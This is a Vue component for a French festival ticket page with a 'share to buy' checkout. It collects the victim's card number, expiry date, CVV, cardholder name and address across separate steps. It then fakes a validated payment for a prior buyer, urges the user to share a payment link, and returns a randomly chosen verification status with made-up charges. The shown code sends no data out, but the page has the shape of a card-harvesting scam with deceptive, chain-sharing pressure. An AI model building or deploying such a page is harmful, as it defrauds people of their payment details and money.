<script setup lang="ts">
import { ref, reactive } from 'vue';
import { Share2, Copy, Hourglass, CheckCircle } from 'lucide-vue-next';
import StepContainer from './StepContainer.vue';
import NavigationButtons from './NavigationButtons.vue';
import PaymentInput from './PaymentInput.vue';
import UserAvatar from './UserAvatar.vue';
import type { FormData } from '../types';

const formData = reactive<FormData>({
  currentStep: 0,
  agreementStep1: false,
  agreementStep2: false,
  firstName: '',
  lastName: '',
  cardNumber: '',
  expiryDate: '',
  cvv: '',
  cardName: '',
  address: '',
  isLoading: false,
  verificationStatus: null
});

const TOTAL_STEPS = 12;
const showCopyToast = ref(false);

const nextStep = () => {
  formData.currentStep++;
};

const previousStep = () => {
  if (formData.currentStep > 0) {
    formData.currentStep--;
  }
};

const handleSaveAddress = async () => {
  formData.isLoading = true;
  await new Promise(resolve => setTimeout(resolve, 1500));
  formData.isLoading = false;
  nextStep();
};

const copyLink = async () => {
  const link = 'https://741aceda-1eaa-47bb-a8db-b122bd08ed10.lovableproject.com/payment/wngbu8';
  await navigator.clipboard.writeText(link);
  showCopyToast.value = true;
  setTimeout(() => {
    showCopyToast.value = false;
  }, 2000);
};

const checkVerification = async () => {
  formData.isLoading = true;
  await new Promise(resolve => setTimeout(resolve, 1500));
  const statuses = ['pending', 'validated', 'waiting'] as const;
  const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
  formData.verificationStatus = randomStatus;
  formData.isLoading = false;
};
</script>

<template>
  <div class="min-h-screen flex items-center justify-center p-4">
    <div class="w-full max-w-lg">
      <div class="text-center mb-8">
        <h1 class="font-anton text-3xl md:text-4xl text-white mb-2">FESTIVAL ÉLECTRONIQUE</h1>
        <p class="text-blue-200">Prêt à partager pour débloquer l'achat ?</p>
      </div>

      <div v-if="formData.currentStep === 0">
        <div class="glass-card">
          <img 
            src="https://images.pexels.com/photos/1763075/pexels-photo-1763075.jpeg"
            alt="Festival électronique"
            class="w-full h-48 object-cover rounded-lg mb-4"
          />
          <h2 class="font-anton text-2xl text-white mb-2">Ticket Pass 1 Jour - Vendredi</h2>
          <p class="text-blue-200 mb-4">Les Plages Electroniques 2025 - Festival de musique électronique</p>
          <div class="flex items-baseline gap-2 mb-6">
            <span class="text-2xl font-bold text-white">45,00 €</span>
            <span class="text-blue-200 line-through">62,00 €</span>
          </div>
          <button @click="nextStep" class="btn-primary w-full flex items-center justify-center gap-2">
            <Share2 class="w-5 h-5" />
            PARTAGER POUR ACHETER
          </button>
        </div>
      </div>

      <div v-else class="glass-card">
        <div v-if="formData.currentStep === 1" class="text-center">
          <h2 class="text-2xl text-white mb-4">Conditions d'utilisation</h2>
          <div class="space-y-4">
            <label class="flex items-start gap-2 cursor-pointer">
              <input 
                type="checkbox" 
                v-model="formData.agreementStep1"
                class="mt-1"
              />
              <span class="text-blue-200">J'accepte les conditions générales de vente et la politique de confidentialité</span>
            </label>
          </div>
        </div>

        <div v-if="formData.currentStep === 2" class="text-center">
          <h2 class="text-2xl text-white mb-4">Conditions de paiement</h2>
          <div class="space-y-4">
            <label class="flex items-start gap-2 cursor-pointer">
              <input 
                type="checkbox" 
                v-model="formData.agreementStep2"
                class="mt-1"
              />
              <span class="text-blue-200">J'accepte les conditions de paiement et de remboursement</span>
            </label>
          </div>
        </div>

        <div v-if="formData.currentStep === 3">
          <PaymentInput
            v-model="formData.firstName"
            label="Prénom"
            placeholder="Votre prénom"
          />
        </div>

        <div v-if="formData.currentStep === 4">
          <PaymentInput
            v-model="formData.lastName"
            label="Nom"
            placeholder="Votre nom"
          />
        </div>

        <div v-if="formData.currentStep === 5">
          <PaymentInput
            v-model="formData.cardNumber"
            label="Numéro de carte"
            placeholder="1234 5678 9012 3456"
            :maxLength="19"
            icon
          />
        </div>

        <div v-if="formData.currentStep === 6">
          <PaymentInput
            v-model="formData.expiryDate"
            label="Date d'expiration"
            placeholder="MM/YY"
            :maxLength="5"
          />
        </div>

        <div v-if="formData.currentStep === 7">
          <PaymentInput
            v-model="formData.cvv"
            label="CVV"
            type="password"
            placeholder="123"
            :maxLength="3"
          />
        </div>

        <div v-if="formData.currentStep === 8">
          <PaymentInput
            v-model="formData.cardName"
            label="Nom sur la carte"
            placeholder="JOHN DOE"
          />
        </div>

        <div v-if="formData.currentStep === 9">
          <PaymentInput
            v-model="formData.address"
            label="Adresse"
            placeholder="123 rue Example"
          />
          <button 
            @click="handleSaveAddress"
            class="btn-primary w-full mt-4"
            :disabled="formData.isLoading"
          >
            {{ formData.isLoading ? 'ENREGISTREMENT...' : 'ENREGISTRER' }}
          </button>
        </div>

        <div v-if="formData.currentStep === 10" class="text-center">
          <div class="flex justify-center mb-6">
            <UserAvatar initials="MD" />
          </div>
          <h2 class="font-anton text-3xl text-white mb-2">PAIEMENT VALIDÉ</h2>
          <p class="text-blue-200 mb-6">Vous avez confirmé le paiement de la personne précédente "Marie Dubois"</p>
          <button @click="nextStep" class="btn-primary w-full">CONTINUER</button>
        </div>

        <div v-if="formData.currentStep === 11" class="text-center">
          <h2 class="font-anton text-3xl text-white mb-2">À VOUS DE PARTAGER !</h2>
          <p class="text-blue-200 mb-8">pour faire valider votre achat</p>
          
          <div class="border border-dashed border-white/20 rounded-lg p-4 mb-6">
            <p class="text-blue-200 break-all">
              https://741aceda-1eaa-47bb-a8db-b122bd08ed10.lovableproject.com/payment/wngbu8
            </p>
          </div>

          <button 
            @click="copyLink"
            class="btn-primary w-full flex items-center justify-center gap-2"
          >
            <Copy class="w-5 h-5" />
            COPIER LE LIEN
          </button>

          <p class="text-sm text-blue-200 mt-4">
            Le destinataire pourra effectuer le paiement en cliquant sur ce lien
          </p>

          <div 
            v-if="showCopyToast"
            class="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-white text-blue-900 px-4 py-2 rounded-lg shadow-lg"
          >
            Lien copié !
          </div>
        </div>

        <div v-if="formData.currentStep === 12" class="text-center">
          <div class="flex flex-col items-center mb-6">
            <div class="mb-4">
              <Hourglass v-if="!formData.verificationStatus || formData.verificationStatus === 'waiting'" 
                class="w-16 h-16 text-orange-400" />
              <CheckCircle v-else-if="formData.verificationStatus === 'validated'"
                class="w-16 h-16 text-green-400" />
            </div>
            <h2 class="font-anton text-3xl text-white">
              {{ !formData.verificationStatus || formData.verificationStatus === 'waiting' ? 'EN COURS' : 'VALIDÉ' }}
            </h2>
          </div>

          <div class="bg-white/5 rounded-lg p-6 mb-6 text-left">
            <div class="grid grid-cols-2 gap-4">
              <p class="text-blue-200">Client :</p>
              <p class="text-white text-right">MARIE ZGEZG</p>
              
              <p class="text-blue-200">Produit :</p>
              <p class="text-white text-right">Ticket Pass 1 Jour - Vendredi</p>
              
              <p class="text-blue-200">Adresse :</p>
              <p class="text-white text-right">{{ formData.address || 'Non renseignée' }}</p>
              
              <p class="text-blue-200">Débité maintenant :</p>
              <p class="text-white text-right">22,50€</p>
              
              <p class="text-blue-200">Débité à la validation :</p>
              <p class="text-white text-right">22,50€</p>
            </div>
          </div>

          <button 
            @click="checkVerification"
            class="btn-primary w-full flex items-center justify-center gap-2"
            :disabled="formData.isLoading"
          >
            <span v-if="formData.isLoading">VÉRIFICATION EN COURS...</span>
            <span v-else>VÉRIFIER LA VALIDATION</span>
          </button>
        </div>

        <NavigationButtons
          v-if="formData.currentStep !== 0 && formData.currentStep !== 10"
          :can-go-back="formData.currentStep > 0"
          :can-continue="(formData.currentStep === 1 && formData.agreementStep1) ||
                        (formData.currentStep === 2 && formData.agreementStep2) ||
                        (formData.currentStep === 3 && formData.firstName) ||
                        (formData.currentStep === 4 && formData.lastName) ||
                        (formData.currentStep === 5 && formData.cardNumber) ||
                        (formData.currentStep === 6 && formData.expiryDate) ||
                        (formData.currentStep === 7 && formData.cvv) ||
                        (formData.currentStep === 8 && formData.cardName) ||
                        formData.currentStep === 11"
          :loading="formData.isLoading"
          @back="previousStep"
          @continue="nextStep"
        />
      </div>
    </div>
  </div>
</template>